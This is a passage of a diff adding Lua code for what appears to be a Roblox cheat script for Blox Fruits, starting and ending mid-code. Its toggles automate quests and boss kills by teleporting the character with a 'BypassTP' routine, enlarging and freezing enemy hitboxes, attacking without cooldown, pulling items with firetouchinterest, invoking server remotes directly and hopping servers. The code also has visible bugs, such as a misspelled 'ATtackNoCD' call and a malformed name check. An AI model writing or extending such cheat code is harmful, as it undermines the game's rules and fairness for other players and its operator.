+						if ((CFrame.new((-1612.55884), 36.9774132, 148.719543, 0.37091279, 0.0000000030717151, (-0.928667724), 0.0000000397099491, 1, 0.0000000191679348, 0.928667724, (-0.0000000439869794), 0.37091279)).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
+							topos((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+							wait(1);
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate1.Button.CFrame;
+							wait(1);
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate2.Button.CFrame;
+							wait(1);
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate3.Button.CFrame;
+							wait(1);
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate4.Button.CFrame;
+							wait(1);
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (game:GetService("Workspace")).Map.Jungle.QuestPlates.Plate5.Button.CFrame;
+							wait(1);
+						else
+							topos(CFrame.new(-1612.55884, 36.9774132, 148.719543, 0.37091279, 0.0000000030717151, -0.928667724, 0.0000000397099491, 1, 0.0000000191679348, 0.928667724, -0.0000000439869794, 0.37091279));
+						end;
+					elseif (game:GetService("Workspace")).Map.Desert.Burn.Part.Transparency == 0 then
+						if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Torch") or game.Players.LocalPlayer.Character:FindFirstChild("Torch") then
+							EquipWeapon("Torch");
+							topos(CFrame.new(1114.61475, 5.04679728, 4350.22803, -0.648466587, -0.00000000128799094, 0.761243105, -0.000000000570652914, 1, 0.00000000120584542, -0.761243105, 0.000000000347544882, -0.648466587));
+						else
+							topos(CFrame.new(-1610.00757, 11.5049858, 164.001587, 0.984807551, -0.167722285, -0.0449818149, 0.17364943, 0.951244235, 0.254912198, 0.0000342372805, -0.258850515, 0.965917408));
+						end;
+					elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan") ~= 0 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "GetCup");
+						wait(0.5);
+						EquipWeapon("Cup");
+						wait(0.5);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "FillCup", (game:GetService("Players")).LocalPlayer.Character.Cup);
+						wait(0);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan");
+					elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == nil then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon");
+					elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 0 then
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Mob Leader") or (game:GetService("ReplicatedStorage")):FindFirstChild("Mob Leader") then
+							topos(CFrame.new(-2967.59521, -4.91089821, 5328.70703, 0.342208564, -0.0227849055, 0.939347804, 0.0251603816, 0.999569714, 0.0150796166, -0.939287126, 0.0184739735, 0.342634559));
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == "Mob Leader" then
+									if (game:GetService("Workspace")).Enemies:FindFirstChild("Mob Leader [Lv. 120] [Boss]") then
+										if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+											repeat
+												task.wait(_G.FastAttackDelay);
+												AutoHaki();
+												EquipWeapon(_G.SelectWeapon);
+												v.HumanoidRootPart.CanCollide = false;
+												v.Humanoid.WalkSpeed = 0;
+												v.HumanoidRootPart.Size = Vector3.new(80, 80, 80);
+												topos(v.HumanoidRootPart.CFrame * Pos);
+												AttackNoCD();
+											until v.Humanoid.Health <= 0 or (not _G.Auto_Saber);
+										end;
+									end;
+									if (game:GetService("ReplicatedStorage")):FindFirstChild("Mob Leader") then
+										topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Mob Leader")).HumanoidRootPart.CFrame * Farm_Mode);
+									end;
+								end;
+							end;
+						end;
+					elseif (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 1 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon");
+						wait(0.5);
+						EquipWeapon("Relic");
+						wait(0.5);
+						topos(CFrame.new(-1404.91504, 29.9773273, 3.80598116, 0.876514494, 0.00000000566906877, 0.481375456, 0.0000000253851997, 1, -0.0000000579995607, -0.481375456, 0.0000000630572643, 0.876514494));
+					end;
+				elseif (game:GetService("Workspace")).Enemies:FindFirstChild("Saber Expert") or (game:GetService("ReplicatedStorage")):FindFirstChild("Saber Expert") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+							if v.Name == "Saber Expert" then
+								repeat
+									task.wait(_G.FastAttackDelay);
+									EquipWeapon(_G.SelectWeapon);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+									v.HumanoidRootPart.Transparency = 1;
+									v.Humanoid.JumpPower = 0;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.CanCollide = false;
+									StartBring = true;
+									PosMon = v.HumanoidRootPart.CFrame;
+									MonFarm = v.Name;
+									AttackNoCD();
+								until v.Humanoid.Health <= 0 or (not _G.Auto_Saber);
+								StartBring = true;
+								if v.Humanoid.Health <= 0 then
+									(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ProQuestProgress", "PlaceRelic");
+								end;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+ItemsTab:Seperator("Other");
+ItemsTab:Toggle("Auto ArenaTrainer", _G.AutoArenaTrainer, false, function(value)
+	_G.Namfon = value;
+	StopTween(_G.Namfon);
+end);
+local GGPos = CFrame.new(3757.732421875, 91.99540710449219, 253.65066528320312);
+spawn(function()
+	while wait() do
+		if _G.Namfon and World3 then
+			pcall(function()
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Training Dummy") or string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Training Dummy") or string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Training Dummy") then
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Training Dummy") or (game:GetService("Workspace")).Enemies:FindFirstChild("Training Dummy") or (game:GetService("Workspace")).Enemies:FindFirstChild("Training Dummy") then
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == "Training Dummy" or v.Name == "Training Dummy" or v.Name == "Training Dummy" then
+									if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+										repeat
+											wait(_G.FastAttackDelay);
+											AutoHaki();
+											EquipWeapon(_G.SelectWeapon);
+											Fastattack = true;
+											v.HumanoidRootPart.CanCollide = false;
+											v.Humanoid.WalkSpeed = 0;
+											v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											AttackNoCD();
+										until _G.Namfon == false or v.Humanoid.Health <= 0 or (not v.Parent);
+										Fastattack = false;
+									end;
+								end;
+							end;
+						else
+							if BypassTP then
+								if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - GGPos.Position).Magnitude > 1500 then
+									BTP(GGPos);
+								elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - GGPos.Position).Magnitude < 1500 then
+									topos(GGPos);
+								end;
+							else
+								topos(GGPos);
+							end;
+							topos(CFrame.new(3757.732421875, 91.99540710449219, 253.65066528320312));
+							if (game:GetService("ReplicatedStorage")):FindFirstChild("Training Dummy") then
+								topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Training Dummy")).HumanoidRootPart.CFrame * MethodFarm);
+							elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Training Dummy") then
+								topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Training Dummy")).HumanoidRootPart.CFrame * MethodFarm);
+							elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Training Dummy") then
+								topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Training Dummy")).HumanoidRootPart.CFrame * MethodFarm);
+							end;
+						end;
+					end;
+				elseif _G.AutoArenaTrainerHop and (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ArenaTrainer") == "I don't have anything for you right now. Come back later." then
+					hop();
+				else
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ArenaTrainer");
+				end;
+			end);
+		end;
+	end;
+end);
+ItemsTab:Toggle("Auto Kill Rip Indra", _G.AutoDarkDagger, false, function(value)
+	_G.AutoDarkDagger = value;
+	StopTween(_G.AutoDarkDagger);
+end);
+local AdminPos = CFrame.new(-5344.822265625, 423.98541259766, -2725.0930175781);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoDarkDagger then
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra True Form") or (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == ("rip_indra True Form" or v.Name == "rip_indra") and v.Humanoid.Health > 0 and v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+							repeat
+								task.wait(_G.FastAttackDelay);
+								pcall(function()
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+								end);
+							until _G.AutoDarkDagger == false or v.Humanoid.Health <= 0;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - AdminPos.Position).Magnitude > 1500 then
+							BTP(AdminPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - AdminPos.Position).Magnitude < 1500 then
+							topos(AdminPos);
+						end;
+					else
+						topos(AdminPos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(-5344.822265625, 423.98541259766, -2725.0930175781));
+				end;
+			end;
+		end;
+	end);
+end);
+ItemsTab:Toggle("Auto Press Haki Button", _G.Farm_Ob_Color, "Need Legendary Haki Color", function(vu)
+	Open_Color_Haki = vu;
+	StopTween(Open_Color_Haki);
+end);
+spawn(function()
+	while wait(0.3) do
+		pcall(function()
+			if Open_Color_Haki then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("activateColor", "Winter Sky");
+				wait(0.5);
+				repeat
+					topos(CFrame.new(-5420.16602, 1084.9657, -2666.8208));
+					wait();
+				until _G.StopTween == true or Open_Color_Haki == false or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-5420.16602), 1084.9657, (-2666.8208))).Magnitude <= 10;
+				wait(0.5);
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("activateColor", "Pure Red");
+				wait(0.5);
+				repeat
+					topos(CFrame.new(-5414.41357, 309.865753, -2212.45776));
+					wait();
+				until _G.StopTween == true or Open_Color_Haki == false or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-5414.41357), 309.865753, (-2212.45776))).Magnitude <= 10;
+				wait(0.5);
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("activateColor", "Snow White");
+				wait(0.5);
+				repeat
+					topos(CFrame.new(-4971.47559, 331.565765, -3720.02954));
+					wait();
+				until _G.StopTween == true or Open_Color_Haki == false or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-4971.47559), 331.565765, (-3720.02954))).Magnitude <= 10;
+				wait(0.5);
+				(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 600));
+				wait(3);
+				(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 600));
+			end;
+		end);
+	end;
+end);
+ItemsTab:Toggle("Auto Musketeer Hat", _G.AutoMusketeerHat, false, function(value)
+	_G.AutoMusketeerHat = value;
+	StopTween(_G.AutoMusketeerHat);
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.AutoMusketeerHat then
+				if (game:GetService("Players")).LocalPlayer.Data.Level.Value >= 1800 and ((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CitizenQuestProgress")).KilledBandits == false then
+					if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Forest Pirate") and string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Forest Pirate") then
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == "Forest Pirate" then
+									repeat
+										task.wait(_G.FastAttackDelay);
+										pcall(function()
+											EquipWeapon(_G.SelectWeapon);
+											AutoHaki();
+											v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											v.HumanoidRootPart.CanCollide = false;
+											AttackNoCD();
+											PosMon = v.HumanoidRootPart.CFrame;
+											MonFarm = v.Name;
+											StartBring = true;
+										end);
+									until _G.AutoMusketeerHat == false or (not v.Parent) or v.Humanoid.Health <= 0 or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+									StartBring = false;
+								end;
+							end;
+						else
+							StartBring = false;
+							topos(CFrame.new(-13206.452148438, 425.89199829102, -7964.5537109375));
+						end;
+					else
+						topos(CFrame.new(-12443.8671875, 332.40396118164, -7675.4892578125));
+						if (Vector3.new((-12443.8671875), 332.40396118164, (-7675.4892578125)) - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 30 then
+							wait(1.5);
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", "CitizenQuest", 1);
+						end;
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.Data.Level.Value >= 1800 and ((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CitizenQuestProgress")).KilledBoss == false then
+					if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible and string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Captain Elephant") and (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Captain Elephant") then
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == "Captain Elephant" then
+									OldCFrameElephant = v.HumanoidRootPart.CFrame;
+									repeat
+										task.wait(_G.FastAttackDelay);
+										pcall(function()
+											EquipWeapon(_G.SelectWeapon);
+											AutoHaki();
+											v.HumanoidRootPart.CanCollide = false;
+											v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											v.HumanoidRootPart.CanCollide = false;
+											v.HumanoidRootPart.CFrame = OldCFrameElephant;
+											ATtackNoCD();
+										end);
+									until _G.AutoMusketeerHat == false or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+								end;
+							end;
+						else
+							topos(CFrame.new(-13374.889648438, 421.27752685547, -8225.208984375));
+						end;
+					else
+						topos(CFrame.new(-12443.8671875, 332.40396118164, -7675.4892578125));
+						if ((CFrame.new((-12443.8671875), 332.40396118164, (-7675.4892578125))).Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4 then
+							wait(1.5);
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen");
+						end;
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.Data.Level.Value >= 1800 and (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen") == 2 then
+					topos(CFrame.new(-12512.138671875, 340.39279174805, -9872.8203125));
+				end;
+			end;
+		end;
+	end);
+end);
+ItemsTab:Toggle("Auto Rainbow Haki", _G.Auto_Rainbow_Haki, false, function(value)
+	_G.Auto_Rainbow_Haki = value;
+	StopTween(_G.Auto_Rainbow_Haki);
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.Auto_Rainbow_Haki then
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+					topos(CFrame.new(-11892.0703125, 930.57672119141, -8760.1591796875));
+					if (Vector3.new((-11892.0703125), 930.57672119141, (-8760.1591796875)) - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 30 then
+						wait(1.5);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("HornedMan", "Bet");
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true and string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Stone") then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Stone") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Stone" then
+								OldCFrameRainbow = v.HumanoidRootPart.CFrame;
+								repeat
+									task.wait(_G.FastAttackDelay);
+									EquipWeapon(_G.SelectWeapon);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									v.HumanoidRootPart.CanCollide = false;
+									v.HumanoidRootPart.CFrame = OldCFrameRainbow;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									AttackNoCD();
+								until _G.Auto_Rainbow_Haki == false or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+							end;
+						end;
+					else
+						topos(CFrame.new(-1086.11621, 38.8425903, 6768.71436, 0.0231462717, -0.592676699, 0.805107772, 0.0000203251839, 0.805323839, 0.592835128, -0.999732077, -0.0137055516, 0.0186523199));
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true and string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Island Empress") then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Island Empress") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Island Empress" then
+								OldCFrameRainbow = v.HumanoidRootPart.CFrame;
+								repeat
+									task.wait(_G.FastAttackDelay);
+									EquipWeapon(_G.SelectWeapon);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									v.HumanoidRootPart.CanCollide = false;
+									v.HumanoidRootPart.CFrame = OldCFrameRainbow;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									AttackNoCD();
+								until _G.Auto_Rainbow_Haki == false or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+							end;
+						end;
+					else
+						topos(CFrame.new(5713.98877, 601.922974, 202.751251, -0.101080291, -0, -0.994878292, -0, 1, -0, 0.994878292, 0, -0.101080291));
+					end;
+				elseif string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Kilo Admiral") then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Kilo Admiral") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Kilo Admiral" then
+								OldCFrameRainbow = v.HumanoidRootPart.CFrame;
+								repeat
+									task.wait(_G.FastAttackDelay);
+									EquipWeapon(_G.SelectWeapon);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									v.HumanoidRootPart.CanCollide = false;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									v.HumanoidRootPart.CFrame = OldCFrameRainbow;
+									AttackNoCD();
+								until _G.Auto_Rainbow_Haki == false or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+							end;
+						end;
+					else
+						topos(CFrame.new(2877.61743, 423.558685, -7207.31006, -0.989591599, -0, -0.143904909, -0, 1.00000012, -0, 0.143904924, 0, -0.989591479));
+					end;
+				elseif string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Captain Elephant") then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Captain Elephant") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Captain Elephant" then
+								OldCFrameRainbow = v.HumanoidRootPart.CFrame;
+								repeat
+									task.wait(_G.FastAttackDelay);
+									EquipWeapon(_G.SelectWeapon);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									v.HumanoidRootPart.CanCollide = false;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									v.HumanoidRootPart.CFrame = OldCFrameRainbow;
+									AttackNoCD();
+								until _G.Auto_Rainbow_Haki == false or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+							end;
+						end;
+					else
+						topos(CFrame.new(-13485.0283, 331.709259, -8012.4873, 0.714521289, 0.0000000798849911, 0.69961375, -0.000000102065748, 1, -0.00000000994383065, -0.69961375, -0.0000000643015241, 0.714521289));
+					end;
+				elseif string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Beautiful Pirate") then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Beautiful Pirate") then
+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v.Name == "Beautiful Pirate" then
+								OldCFrameRainbow = v.HumanoidRootPart.CFrame;
+								repeat
+									task.wait(_G.FastAttackDelay);
+									EquipWeapon(_G.SelectWeapon);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									v.HumanoidRootPart.CanCollide = false;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									v.HumanoidRootPart.CFrame = OldCFrameRainbow;
+									AttackNoCD();
+								until _G.Auto_Rainbow_Haki == false or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+							end;
+						end;
+					else
+						topos(CFrame.new(5312.3598632813, 20.141201019287, -10.158538818359));
+					end;
+				else
+					topos(CFrame.new(-11892.0703125, 930.57672119141, -8760.1591796875));
+					if (Vector3.new((-11892.0703125), 930.57672119141, (-8760.1591796875)) - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 30 then
+						wait(1.5);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("HornedMan", "Bet");
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.AutoObservationv2 then
+				if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen") == 3 then
+					_G.AutoMusketeerHat = false;
+					if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Banana") and (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Apple") and (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Pineapple") then
+						repeat
+							topos(CFrame.new(-12444.78515625, 332.40396118164, -7673.1806640625));
+							wait();
+						until not _G.AutoObservationv2 or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-12444.78515625), 332.40396118164, (-7673.1806640625))).Magnitude <= 10;
+						wait(0.5);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen");
+					elseif (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Fruit Bowl") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Fruit Bowl") then
+						repeat
+							topos(CFrame.new(-10920.125, 624.20275878906, -10266.995117188));
+							wait();
+						until not _G.AutoObservationv2 or ((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new((-10920.125), 624.20275878906, (-10266.995117188))).Magnitude <= 10;
+						wait(0.5);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("KenTalk2", "Start");
+						wait(1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("KenTalk2", "Buy");
+					else
+						for i, v in pairs((game:GetService("Workspace")):GetDescendants()) do
+							if v.Name == "Apple" or v.Name == "Banana" or v.Name == "Pineapple" then
+								v.Handle.CFrame = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 10);
+								wait();
+								firetouchinterest((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart, v.Handle, 0);
+								wait();
+							end;
+						end;
+					end;
+				else
+					_G.AutoMusketeerHat = true;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoRengoku then
+				if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Hidden Key") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Hidden Key") then
+					EquipWeapon("Hidden Key");
+					topos(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875));
+				elseif (game:GetService("Workspace")).Enemies:FindFirstChild("Snow Lurker") or (game:GetService("Workspace")).Enemies:FindFirstChild("Arctic Warrior") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if (v.Name == "Snow Lurker" or v.Name == "Arctic Warrior") and v.Humanoid.Health > 0 then
+							repeat
+								task.wait(_G.FastAttackDelay);
+								EquipWeapon(_G.SelectWeapon);
+								AutoHaki();
+								v.HumanoidRootPart.CanCollide = false;
+								v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+								PosMon = v.HumanoidRootPart.CFrame;
+								MonFarm = v.Name;
+								topos(v.HumanoidRootPart.CFrame * Pos);
+								AttackNoCD();
+								StartBring = true;
+							until (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Hidden Key") or _G.AutoRengoku == false or (not v.Parent) or v.Humanoid.Health <= 0;
+							StartBring = false;
+						end;
+					end;
+				else
+					StartBring = false;
+					topos(CFrame.new(5439.716796875, 84.420944213867, -6715.1635742188));
+				end;
+			end;
+		end;
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if _G.AutoEctoplasm then
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Ship Deckhand") or (game:GetService("Workspace")).Enemies:FindFirstChild("Ship Engineer") or (game:GetService("Workspace")).Enemies:FindFirstChild("Ship Steward") or (game:GetService("Workspace")).Enemies:FindFirstChild("Ship Officer") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Ship Deckhand" or v.Name == "Ship Engineer" or v.Name == "Ship Steward" or v.Name == "Ship Officer" then
+							repeat
+								task.wait(_G.FastAttackDelay);
+								EquipWeapon(_G.SelectWeapon);
+								AutoHaki();
+								if string.find(v.Name, "Ship") then
+									v.HumanoidRootPart.CanCollide = false;
+									v.Head.CanCollide = false;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									AttackNoCD();
+									PosMon = v.HumanoidRootPart.CFrame;
+									MonFarm = v.Name;
+									StartBring = true;
+								else
+									StartBring = false;
+									topos(CFrame.new(911.35827636719, 125.95812988281, 33159.5390625));
+								end;
+							until _G.AutoEctoplasm == false or (not v.Parent) or v.Humanoid.Health <= 0;
+							StartBring = false;
+						end;
+					end;
+				else
+					local Distance = (Vector3.new(911.35827636719, 125.95812988281, 33159.5390625) - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude;
+					if Distance > 18000 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125));
+					end;
+					topos(CFrame.new(911.35827636719, 125.95812988281, 33159.5390625));
+				end;
+			end;
+		end;
+	end);
+end);
+ItemsTab:Toggle("Auto Bartlio Quest", _G.AutoBartilo, false, function(value)
+	_G.AutoBartilo = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.AutoBartilo then
+				if (game:GetService("Players")).LocalPlayer.Data.Level.Value >= 800 and (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 0 then
+					if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan Pirates") and string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
